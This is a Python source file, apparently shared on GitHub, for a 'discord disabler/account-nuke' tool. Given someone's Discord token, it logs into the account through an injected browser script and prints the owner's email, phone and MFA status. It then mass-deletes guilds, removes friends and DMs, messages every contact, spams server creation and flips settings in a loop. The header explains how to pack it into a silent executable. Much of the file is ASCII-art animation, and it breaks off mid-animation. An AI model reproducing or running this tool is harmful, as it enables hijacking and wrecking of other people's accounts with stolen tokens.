#==========#=============================================================#
#  SOCIAL  # author: social/s4cial on github							 #
#==========# discord disabler/account-nuke                               #
# PYTHON 3 # features an interactive menu, magenta theme, & is quick     #
#==========#=============================================================#
# PY > EXE #															 #
#==========##==========##==========##==========##==========##============#
# pip install pyinstaller												 #
# cd path/to/files/												         #
# pyinstaller --clean --onefile --noconsole --i icon.ico discdisable.py  #
#==========##==========##==========##==========##==========##============#
#                                                                        #
# please respect my work & don't pass this off as your own. - social     #
#                                                                        #
#==========##==========##==========##==========##==========##============#
import threading, requests, discord, random, time, os, ctypes, signal, sys, asyncio
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

if sys.version_info[0] == 3 and sys.version_info[1] >= 8 and sys.platform.startswith('win'): # runtimeerror: event loop is closed | python3, windows (workaround)
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

def sigint_handler(signal, frame):
    print(f'''\n
    EXITING > DISCORD DISABLE v1.0\n{Fore.MAGENTA}
    ███████╗██╗  ██╗██╗████████╗██╗███╗   ██╗ ██████╗       
    ██╔════╝╚██╗██╔╝██║╚══██╔══╝██║████╗  ██║██╔════╝       
    █████╗   ╚███╔╝ ██║   ██║   ██║██╔██╗ ██║██║  ███╗      
    ██╔══╝   ██╔██╗ ██║   ██║   ██║██║╚██╗██║██║   ██║      
    ███████╗██╔╝ ██╗██║   ██║   ██║██║ ╚████║╚██████╔╝██╗██╗
    ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝{Fore.RESET}
    DISCORD DISABLE v1.0 {Fore.RESET}
    CREATED BY {Fore.MAGENTA}SOCIAL.{Fore.RESET}''')
    time.sleep(5)
    sys.exit(0)
signal.signal(signal.SIGINT, sigint_handler)

ctypes.windll.kernel32.SetConsoleTitleW("discord disable | v1.0")

init(convert=True)
guildsIds = []
friendsIds = []
channelIds = []
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.MAGENTA}-{Fore.RESET}] INVALID TOKEN", e)
            input("PRESS ANY KEY TO EXIT > "); exit(0)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.MAGENTA}UUID{Fore.RESET}]         {userID}
            [{Fore.MAGENTA}USER{Fore.RESET}]       {userName}
            [{Fore.MAGENTA}MFA{Fore.RESET}]        {mfa}

            [{Fore.MAGENTA}EMAIL{Fore.RESET}]           {email}
            [{Fore.MAGENTA}PHONE NUMBER{Fore.RESET}]    {phone if phone else ""}
            [{Fore.MAGENTA}Token{Fore.RESET}]           {token}

            ''')
            input()

def tokenFuck(token):
    headers = {'Authorization': token}
    gdel = input(f'DELETE ALL GUILDS? [Y/N] (NO CAPS) > ')
    fdel = input('REMOVE ALL FRIENDS? [Y/N] (NO CAPS) > ')
    sendall = input('SEND ALL DM\'S? [Y/N] (NO CAPS) > ')
    fremove = input('REMOVE ALL DM\'S? [Y/N] (NO CAPS) > ')
    gleave = input('LEAVE ALL GUILDS? [Y/N] (NO CAPS) > ')
    gcreate = input('SPAM GUILD-CREATION?  [Y/N] (NO CAPS) > ')
    dlmode = input('SPAM-CHANGE DARK/LIGHT MODE [Y/N] (NO CAPS)] > ')
    langspam = input('SPAM-CHANGE LANGUAGE? [Y/N] (NO CAPS) > ')
    print(f"[{Fore.MAGENTA}+{Fore.RESET}] NUKING ACCOUNT...")

    if gleave == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
                print(f'LEFT GUILD > {guild}')
        except Exception as e:
            print(f'ERROR > {e}')

    if fdel == 'y':
        try:
            for friend in friendsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                print(f'REMOVED FRIEND > {friend}')
        except Exception as e:
            print(f'ERROR > {e}')

    if sendall == 'y':
        try:
            sendmessage = input('DESIRED MESSAGE TO DM-ALL? > ')
            for id in channelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'SENT MESSAGE TO > {id}')
        except Exception as e:
            print(f'ERROR > {e}')

    if fremove == 'y':
        try:
            for id in channelIds:
                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                print(f'REMOVED DM, ID > {id}')
        except Exception as e:
            print(f'ERROR > {e}')

    if gdel == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
                print(f'DELETED GUILD > {guild}')
        except Exception as e:
            print(f'ERROR > {e}')

    if gcreate == 'y':
        try:
            gname = input('DESIRED SPAM-GUILD NAME? > ')
            gserv = input('SPAMMED SERVERS AMOUNT? [MAX=100]')
            for i in range(int(gserv)):
                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                print(f'SERVER > {gname} MADE, COUNT: {i}')
        except Exception as e:
            print(f'ERROR > {e}')

    if dlmode == 'y':
        try:
            modes = cycle(["light", "dark"])
        except Exception as e:
            print(f'ERROR > {e}')

    if langspam == 'y':
        try:
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        except Exception as e:
            print(f'ERROR > {e}')

    time.sleep(9999)

def ddisable():
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗██╗██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.25)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.15)
    clear()

    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗██╗██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.25)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.15)
    clear()

    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗██╗██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.25)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗          
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝          
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗         
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║         
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝██╗
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝
                                                                {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.15)
    clear()

    ctypes.windll.kernel32.SetConsoleTitleW("discord disable | welcome!")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██╗   
    ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝██║
    ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗  ██║
    ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ╚═╝
    ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗██╗
     ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝
                                                                 {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.15)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disable v1.0 | created by social | social#0001")
    print('_' * 108)
    print(f'''
    WELCOME TO:{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     ███████╗
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     ██╔════╝
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗███████║██████╔╝██║     █████╗  
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║██╔══██║██╔══██╗██║     ██╔══╝  
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║██║  ██║██████╔╝███████╗███████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝{Fore.RESET}
    CREATED BY {Fore.MAGENTA}SOCIAL.{Fore.RESET}''')
    print('_' * 108)
    time.sleep(4)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disabl | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗ █████╗ ██████╗ ██╗     
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗██║     
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗███████║██████╔╝██║     
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║██╔══██║██╔══██╗██║     
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║██║  ██║██████╔╝███████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.19)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disab | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗ █████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝██╔══██╗██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗███████║██████╔╝
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║██╔══██║██╔══██╗
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║██║  ██║██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disa | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗ █████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗███████║
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║██╔══██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║██║  ██║
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord dis | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗███████╗
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║██╔════╝
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║███████╗
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║╚════██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║███████║
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.16)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord di | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ██╗
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██║
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║██║
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝██║
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord d | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██║  ██║
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██║  ██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.19)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discor | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("disco | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗
    ██║  ██║██║███████╗██║     ██║   ██║
    ██║  ██║██║╚════██║██║     ██║   ██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("disc | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗
    ██╔══██╗██║██╔════╝██╔════╝
    ██║  ██║██║███████╗██║     
    ██║  ██║██║╚════██║██║     
    ██████╔╝██║███████║╚██████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.16)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("dis | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗
    ██╔══██╗██║██╔════╝
    ██║  ██║██║███████╗
    ██║  ██║██║╚════██║
    ██████╔╝██║███████║
    ╚═════╝ ╚═╝╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("di | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗
    ██╔══██╗██║
    ██║  ██║██║
    ██║  ██║██║
    ██████╔╝██║
    ╚═════╝ ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("d | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ 
    ██╔══██╗
    ██║  ██║
    ██║  ██║
    ██████╔╝
    ╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.19)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("loading..")
    print('_' * 108)
    print('')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("di | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗
    ██╔══██╗██║
    ██║  ██║██║
    ██║  ██║██║
    ██████╔╝██║
    ╚═════╝ ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("dis | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗
    ██╔══██╗██║██╔════╝
    ██║  ██║██║███████╗
    ██║  ██║██║╚════██║
    ██████╔╝██║███████║
    ╚═════╝ ╚═╝╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("disc | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗
    ██╔══██╗██║██╔════╝██╔════╝
    ██║  ██║██║███████╗██║     
    ██║  ██║██║╚════██║██║     
    ██████╔╝██║███████║╚██████╗
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.17)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("disco | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗
    ██║  ██║██║███████╗██║     ██║   ██║
    ██║  ██║██║╚════██║██║     ██║   ██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discor | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.16)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("loading..")
    print('_' * 108)
    print('')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord d | loading.")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗
                                                            ██╔══██╗
                                                            ██║  ██║
                                                            ██║  ██║ 
                                                            ██████╔╝
                                                            ╚═════╝ {Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.20)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord di | loading..")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗
                                                            ██╔══██╗██║
                                                            ██║  ██║██║
                                                            ██║  ██║██║
                                                            ██████╔╝██║
                                                            ╚═════╝ ╚═╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.19)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord dis | loading...")
    print('_' * 108)
    print(f'''{Fore.MAGENTA}
                                                            ██████╗ ██╗███████╗
                                                            ██╔══██╗██║██╔════╝
                                                            ██║  ██║██║███████╗ 
                                                            ██║  ██║██║╚════██║
                                                            ██████╔╝██║███████║
                                                            ╚═════╝ ╚═╝╚══════╝{Fore.RESET}''')
    print('_' * 108)
    time.sleep(0.18)
    clear()
    ctypes.windll.kernel32.SetConsoleTitleW("discord disa | loading..")
    print('_' * 108)
